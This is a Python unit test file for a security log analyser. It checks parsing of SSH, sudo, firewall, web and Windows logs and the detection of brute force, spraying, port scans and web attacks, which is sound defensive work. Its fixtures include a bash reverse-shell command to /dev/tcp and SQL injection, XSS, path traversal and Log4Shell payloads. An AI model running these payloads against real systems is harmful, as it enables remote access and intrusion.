"""Run with:  python -m unittest discover -s tests -v"""
import sys
import unittest
from datetime import datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from sla.detectors import Config, Engine, is_blockable  # noqa: E402
from sla.parsers import LOCAL_TZ, parse_line, parse_windows_xml  # noqa: E402

NOW = datetime(2026, 10, 22, 12, 0, 0, tzinfo=LOCAL_TZ)


def ts(sec):
    t = datetime(2026, 10, 21, 9, 0, 0) + timedelta(seconds=sec)
    return f"{t.strftime('%b')} {t.day:2d} {t.strftime('%H:%M:%S')}"


def ssh(sec, msg):
    return f"{ts(sec)} srv sshd[1]: {msg}"


def run(lines, **cfg):
    engine = Engine(Config(**cfg))
    for line in lines:
        ev = parse_line(line, NOW)
        if ev:
            engine.process(ev)
    return engine


def rules(engine):
    return {a.rule for a in engine.alerts.values()}


class ParserTests(unittest.TestCase):
    def test_failed_password_invalid_user(self):
        ev = parse_line(ssh(0, "Failed password for invalid user admin from 1.2.3.4 port 22 ssh2"), NOW)
        self.assertEqual((ev.kind, ev.user, ev.ip), ("AUTH_FAIL", "admin", "1.2.3.4"))
        self.assertTrue(ev.extra["invalid_user"])

    def test_pam_sshd_duplicate_is_ignored(self):
        line = ssh(0, "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=1.2.3.4  user=root")
        self.assertIsNone(parse_line(line, NOW))

    def test_ipv4_mapped_ipv6(self):
        ev = parse_line(ssh(0, "Failed password for root from ::ffff:5.6.7.8 port 22 ssh2"), NOW)
        self.assertEqual(ev.ip, "5.6.7.8")

    def test_iso_timestamp_journal_format(self):
        ev = parse_line("2026-10-21T09:00:01+0530 srv sshd[9]: Accepted publickey for bob from 9.9.9.9 port 1 ssh2", NOW)
        self.assertEqual((ev.kind, ev.user), ("AUTH_OK", "bob"))
        self.assertEqual(ev.ts.utcoffset(), timedelta(hours=5, minutes=30))

    def test_future_syslog_date_rolls_back_a_year(self):
        ev = parse_line("Dec 31 23:00:00 srv sshd[1]: Failed password for root from 1.1.1.1 port 1 ssh2", NOW)
        self.assertEqual(ev.ts.year, 2025)

    def test_web_line(self):
        ev = parse_line('1.2.3.4 - - [21/Oct/2026:09:00:01 +0000] "GET /a b HTTP/1.1" 404 10 "-" "curl/8"', NOW)
        self.assertEqual((ev.kind, ev.extra["status"], ev.extra["path"]), ("WEB_REQ", 404, "/a b"))

    def test_garbage_lines_do_not_crash(self):
        for junk in ("", "   ", "\x00\x01binary", "Oct 99 99:99:99 x", "random text"):
            self.assertIsNone(parse_line(junk, NOW))

    def test_windows_xml(self):
        xml = ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>4625</EventID>"
               "<TimeCreated SystemTime='2026-10-21T03:30:00.123Z'/><Computer>PC</Computer></System>"
               "<EventData><Data Name='TargetUserName'>bob</Data><Data Name='IpAddress'>8.8.8.8</Data>"
               "<Data Name='LogonType'>3</Data></EventData></Event>")
        evs = parse_windows_xml(xml)
        self.assertEqual((evs[0].kind, evs[0].user, evs[0].ip), ("AUTH_FAIL", "bob", "8.8.8.8"))


class DetectorTests(unittest.TestCase):
    def test_brute_force_fires_once_threshold_reached(self):
        lines = [ssh(i, f"Failed password for root from 6.6.6.6 port {i} ssh2") for i in range(5)]
        self.assertIn("BRUTE_FORCE", rules(run(lines)))

    def test_slow_failures_do_not_alert(self):
        lines = [ssh(i * 600, f"Failed password for root from 6.6.6.6 port {i} ssh2") for i in range(8)]
        self.assertNotIn("BRUTE_FORCE", rules(run(lines)))

    def test_below_threshold_no_alert(self):
        lines = [ssh(i, f"Failed password for root from 6.6.6.6 port {i} ssh2") for i in range(4)]
        self.assertEqual(rules(run(lines)), set())

    def test_pam_plus_failed_is_not_double_counted(self):
        lines = []
        for i in range(3):  # 3 real attempts, each logged twice by sshd
            lines.append(ssh(i, "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=6.6.6.6  user=root"))
            lines.append(ssh(i, f"Failed password for root from 6.6.6.6 port {i} ssh2"))
        engine = run(lines, threshold=5)
        self.assertEqual(engine.stats["fail_by_ip"]["6.6.6.6"], 3)
        self.assertNotIn("BRUTE_FORCE", rules(engine))

    def test_success_after_failures_is_critical(self):
        lines = [ssh(i, f"Failed password for bob from 7.7.7.7 port {i} ssh2") for i in range(3)]
        lines.append(ssh(10, "Accepted password for bob from 7.7.7.7 port 99 ssh2"))
        a = next(x for x in run(lines).alerts.values() if x.rule == "SUCCESS_AFTER_FAILURES")
        self.assertEqual(a.severity, "CRITICAL")

    def test_normal_login_no_alert(self):
        self.assertEqual(rules(run([ssh(0, "Accepted publickey for bob from 7.7.7.7 port 1 ssh2")])), set())

    def test_password_spraying(self):
        users = ["a", "b", "c", "d", "e"]
        lines = [ssh(i, f"Invalid user {u} from 8.8.4.4 port {i}") for i, u in enumerate(users)]
        self.assertIn("PASSWORD_SPRAY", rules(run(lines)))

    def test_distributed_attack_on_one_account(self):
        lines = [ssh(i, f"Failed password for root from 10.9.8.{i} port 1 ssh2") for i in range(5)]
        self.assertIn("DISTRIBUTED_BRUTE_FORCE", rules(run(lines)))

    def test_allowlist_suppresses_alerts(self):
        import ipaddress
        lines = [ssh(i, f"Failed password for root from 6.6.6.6 port {i} ssh2") for i in range(10)]
        self.assertEqual(rules(run(lines, allowlist=[ipaddress.ip_network("6.6.6.0/24")])), set())

    def test_blocklist_always_alerts(self):
        import ipaddress
        lines = [ssh(0, "Accepted publickey for bob from 6.6.6.6 port 1 ssh2")]
        self.assertIn("BLOCKLISTED_IP", rules(run(lines, blocklist=[ipaddress.ip_network("6.6.6.6/32")])))

    def test_sudo_reverse_shell(self):
        line = f"{ts(0)} srv sudo[1]:   eve : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
        a = next(iter(run([line]).alerts.values()))
        self.assertEqual((a.rule, a.severity), ("SUSPICIOUS_COMMAND", "CRITICAL"))

    def test_harmless_sudo_no_alert(self):
        line = f"{ts(0)} srv sudo[1]:   bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt update"
        self.assertEqual(rules(run([line])), set())

    def test_new_user_and_sudo_group(self):
        lines = [f"{ts(0)} srv useradd[1]: new user: name=evil, UID=1001, GID=1001, home=/home/evil, shell=/bin/bash",
                 f"{ts(1)} srv usermod[1]: add 'evil' to group 'sudo'"]
        self.assertEqual(rules(run(lines)), {"ACCOUNT_CREATED", "PRIVILEGE_GRANTED"})

    def test_port_scan_from_firewall_log(self):
        lines = [f"{ts(i)} srv kernel: [1.0] [UFW BLOCK] IN=eth0 SRC=5.5.5.5 DST=10.0.0.1 PROTO=TCP SPT=1 DPT={1000 + i}"
                 for i in range(10)]
        self.assertIn("PORT_SCAN", rules(run(lines)))

    def test_web_attacks(self):
        def web(path, ua="Mozilla/5.0"):
            return f'4.4.4.4 - - [21/Oct/2026:09:00:00 +0000] "GET {path} HTTP/1.1" 200 1 "-" "{ua}"'
        got = rules(run([web("/p?id=1%20UNION%20SELECT%201,2"), web("/?q=<script>alert(1)</script>"),
                         web("/f?x=../../etc/passwd"), web("/", "${jndi:ldap://x/a}"), web("/.env"),
                         web("/", "sqlmap/1.7")]))
        self.assertTrue({"WEB_SQLI", "WEB_XSS", "WEB_TRAVERSAL", "WEB_LOG4SHELL", "WEB_PROBE", "WEB_SCANNER_UA"} <= got)

    def test_normal_web_traffic_no_alert(self):
        lines = [f'4.4.4.4 - - [21/Oct/2026:09:00:{i:02d} +0000] "GET /page{i} HTTP/1.1" 200 1 "-" "Mozilla/5.0"' for i in range(30)]
        self.assertEqual(rules(run(lines)), set())

    def test_off_hours_login(self):
        line = "Oct 21 03:10:00 srv sshd[1]: Accepted publickey for bob from 7.7.7.7 port 1 ssh2"
        self.assertIn("OFF_HOURS_LOGIN", rules(run([line], off_hours=(22, 6))))
        self.assertNotIn("OFF_HOURS_LOGIN", rules(run([line])))

    def test_is_blockable(self):
        self.assertFalse(is_blockable("192.168.1.5"))
        self.assertFalse(is_blockable("127.0.0.1"))
        self.assertTrue(is_blockable("203.0.113.10"))
        self.assertFalse(is_blockable("not-an-ip"))


if __name__ == "__main__":
    unittest.main()
